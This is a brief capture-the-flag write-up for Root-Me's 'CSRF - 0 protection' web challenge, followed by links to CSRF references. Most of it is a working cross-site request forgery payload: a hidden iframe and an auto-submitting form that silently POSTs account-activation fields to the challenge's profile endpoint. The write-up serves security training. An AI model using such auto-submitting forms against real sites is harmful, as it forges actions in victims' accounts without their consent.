# CSRF: zero protection

[root-me challenge: CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection): Activate your account to access intranet.

----

```text
<iframe style="display:none" name="csrfframe"></iframe>
<form name="test" target="csrfframe" enctype="multipart/form-data" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
  <input type="hidden" name="username" value="barzh" />
  <input type="hidden" name="status" value="on" />
</form>
<script>document.test.submit()</script>
```

## Resources

* [https://portswigger.net/web-security/csrf](https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery)
* [PayloadsAllTheThings/CSRF Injection/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
* [HackTricks: CSRF (Cross Site Request Forgery)](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

